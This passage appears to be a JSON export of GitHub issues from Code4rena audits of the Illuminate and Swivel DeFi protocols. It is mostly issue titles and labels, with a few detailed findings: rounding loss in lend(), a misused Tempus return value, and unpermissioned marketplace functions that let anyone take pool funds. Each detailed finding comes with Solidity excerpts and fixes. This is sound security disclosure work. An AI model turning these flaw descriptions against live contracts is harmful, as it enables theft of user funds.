[{"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/74", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/72", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/67", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/66", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/55", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/54", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/51", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "Division Before Multiplication Can Lead To Zero Rounding Of Return Amount", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/48", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L280   # Vulnerability details  ## Impact  There is a division before multiplication bug that exists in [`lend()`](https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L280) for the Swivel case.  If `order.premium` is less than `order.principal` then `returned` will round to zero due to the integer rounding.  When this occurs the user's funds are essentially lost. That is because they transfer in the underlying tokens but the amount sent to `yield(u, y, returned, address(this))` will be zero.  ## Proof of Concept  ```solidity     function lend(         uint8 p,         address u,         uint256 m,         uint256[] calldata a,         address y,         Swivel.Order[] calldata o,         Swivel.Components[] calldata s     ) public unpaused(p) returns (uint256) {          // lent represents the number of underlying tokens lent         uint256 lent;         // returned represents the number of underlying tokens to lend to yield         uint256 returned;          {             uint256 totalFee;             // iterate through each order a calculate the total lent and returned             for (uint256 i = 0; i < o.length; ) {                 Swivel.Order memory order = o[i];                 // Require the Swivel order provided matches the underlying and maturity market provided                 if (order.underlying != u) {                     revert NotEqual('underlying');                 } else if (order.maturity > m) {                     revert NotEqual('maturity');                 }                 // Determine the fee                 uint256 fee = calculateFee(a[i]);                 // Track accumulated fees                 totalFee += fee;                 // Sum the total amount lent to Swivel (amount of ERC5095 tokens to mint) minus fees                 lent += a[i] - fee;                 // Sum the total amount of premium paid from Swivel (amount of underlying to lend to yield)                 returned += (a[i] - fee) * (order.premium / order.principal);                  unchecked {                     i++;                 }             }             // Track accumulated fee             fees[u] += totalFee;              // transfer underlying tokens from user to illuminate             Safe.transferFrom(IERC20(u), msg.sender, address(this), lent);             // fill the orders on swivel protocol             ISwivel(swivelAddr).initiate(o, a, s);              yield(u, y, returned, address(this));         }          emit Lend(p, u, m, lent);         return lent;     } ```  Specifically the function `returned += (a[i] - fee) * (order.premium / order.principal);`  ## Recommended Mitigation Steps  The multiplication should occur before division, that is `((a[i] - fee) * order.premium) / order.principal);`.  "}, {"title": "Centralisation Risk: Admin Can Change Important Variables To Steal Funds", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/44", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-06-illuminate-findings", "body": "Centralisation Risk: Admin Can Change Important Variables To Steal Funds"}, {"title": "`Lender.mint()` May Take The Illuminate PT As Input Which Will Transfer And Mint More Illuminate PT Cause an Infinite Supply", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/42", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-06-illuminate-findings", "body": "`Lender.mint()` May Take The Illuminate PT As Input Which Will Transfer And Mint More Illuminate PT Cause an Infinite Supply"}, {"title": "Safe.sol` does not check that a contract exists allowing infinite minting of Illuminate PTs if a market has a zero address for any of the other PTs.", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "Safe.sol` does not check that a contract exists allowing infinite minting of Illuminate PTs if a market has a zero address for any of the other PTs."}, {"title": "The lend function for tempus uses the wrong return value of depositAndFix", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/37", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L452-L453   # Vulnerability details  ## Impact The depositAndFix function of the TempusController contract returns two uint256 data, the first is the number of shares exchanged for the underlying token, the second is the number of principalToken exchanged for the shares, the second return value should be used in the lend function for tempus. This will cause the contract to mint an incorrect number of illuminateTokens to the user. ## Proof of Concept https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L452-L453 https://github.com/tempus-finance/tempus-protocol/blob/master/contracts/TempusController.sol#L52-L76 ## Tools Used None ## Recommended Mitigation Steps interfaces.sol ``` interface ITempus {     function maturityTime() external view returns (uint256);      function yieldBearingToken() external view returns (IERC20Metadata);      function depositAndFix(         Any,         Any,         uint256,         bool,         uint256,         uint256     ) external returns (uint256, uint256); } ``` Lender.sol ```         (,uint256 returned) = ITempus(tempusAddr).depositAndFix(Any(x), Any(t), a - fee, true, r, d);         returned -= illuminateToken.balanceOf(address(this)); ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/27", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "Marketplace calls unimplemented function", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/22", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-06-illuminate-findings", "body": "Marketplace calls unimplemented function"}, {"title": "sellPrincipalToken, buyPrincipalToken, sellUnderlying, buyUnderlying uses pool funds but pays msg.sender", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/3ca41a9f529980b17fdc67baf8cbee5a8035afab/marketplace/MarketPlace.sol#L136-L189   # Vulnerability details  ## Impact Fund loss from marketplace  ## Proof of Concept sellPrincipalToken, buyPrincipalToken, sellUnderlying, buyUnderlying are all unpermissioned and use marketplace funds to complete the action but send the resulting tokens to msg.sender. This means that any address can call these functions and steal the resulting funds  ## Tools Used  ## Recommended Mitigation Steps All functions should use safetransfer to get funds from msg.sender not from marketplace  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/12", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-illuminate-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/4", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/2", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-illuminate-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/1", "labels": [], "target": "2022-06-illuminate-findings", "body": "Agreement & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/200", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/198", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/197", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/195", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/194", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/193", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/189", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": " Front-runnable `approve` of `Erc20`", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": " Front-runnable `approve` of `Erc20`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/185", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/184", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/183", "labels": ["bug", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/182", "labels": ["bug", "duplicate", "G (Gas Optimization)", "old-submission-method", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/179", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/176", "labels": ["bug", "duplicate", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/173", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "No Transfer Admin Pattern in Creator.sol, MarketPlace.sol and Swivel.sol", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/172", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "No Transfer Admin Pattern in Creator.sol, MarketPlace.sol and Swivel.sol"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/170", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/169", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/165", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/164", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/161", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/160", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/159", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/155", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/152", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/150", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/148", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/142", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/141", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/137", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "VaultTracker miscalculates compounding interest", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/136", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "old-submission-method", "feature?"], "target": "2022-07-swivel-findings", "body": "VaultTracker miscalculates compounding interest"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/135", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/133", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Error in allowance logic", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "resolved"], "target": "2022-07-swivel-findings", "body": "Error in allowance logic"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/127", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/126", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/125", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/123", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/122", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Swivel.scheduleFeeChange(), Swivel.setFee() wouldn't work as expected for user preference.", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/118", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L473 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L495   # Vulnerability details  ## Impact Swivel.scheduleFeeChange(), Swivel.setFee() wouldn't work as expected for user preference.  Users can't react properly after [ScheduleFeeChange() event](https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L477) because they don't know whether the new fee settings would be better/worse for them.   ## Proof of Concept According to [this explanation](https://github.com/code-423n4/2022-07-swivel#admin-privileges), these functions are to ensure users can feel comfortable.  Btw with Swivel.scheduleFeeChange(), it emits only when to change fee settings without detailed values.  So users don't know whether the new fee settings will be better or worse for them.  Even if the admin is going to set larger feenominators for lower fee percent, users don't know that until actual fees are set using setFee() and such delays are almost meaningless for users.  I think we should announce the detailed fee settings with Swivel.scheduleFeeChange() function so that users can react accordingly after checking new fee settings.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend adding an additional array - pendingFeenominators [here](https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L37).  ``` uint16[4] public pendingFeenominators; ```  And scheduleFeeChange() function should have i, d parameters same as current setFee() function so that pendingFeenominators save new settings. (Also keep original fee settings if some indexs aren't updated.)  After that, we can call setFee() without any params and feenominators will be replaced with pendingFeenominators.  "}, {"title": "Swivel.setFee() is implemented wrongly.", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/117", "labels": ["bug", "2 (Med Risk)", "resolved"], "target": "2022-07-swivel-findings", "body": "Swivel.setFee() is implemented wrongly."}, {"title": "With most functions in VaultTracker.sol, users can call them only once after maturity has been reached.", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/116", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved"], "target": "2022-07-swivel-findings", "body": "With most functions in VaultTracker.sol, users can call them only once after maturity has been reached."}, {"title": "Missing checks for address (0x0) when assigning values to address state variables", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/113", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "Missing checks for address (0x0) when assigning values to address state variables"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/112", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/111", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/110", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/109", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/108", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "User can avoid a large portion of fees by using initiate and combineToken to exit a position", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "User can avoid a large portion of fees by using initiate and combineToken to exit a position"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/105", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/102", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/100", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/99", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/98", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/96", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/94", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/93", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/92", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/89", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/88", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/85", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/84", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "No check for zero address while updating owner", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/83", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "No check for zero address while updating owner"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/82", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/78", "labels": ["bug", "duplicate", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/77", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/76", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/75", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/74", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "ERC20 Incorrect check on returnedAddress in permit() results in unlimited approval of zero address", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/72", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved"], "target": "2022-07-swivel-findings", "body": "ERC20 Incorrect check on returnedAddress in permit() results in unlimited approval of zero address"}, {"title": "Loss of funds in an underlying protocol would cause catostrophic loss of funds for swivel", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/71", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor disputed", "partial"], "target": "2022-07-swivel-findings", "body": "Loss of funds in an underlying protocol would cause catostrophic loss of funds for swivel"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/70", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/67", 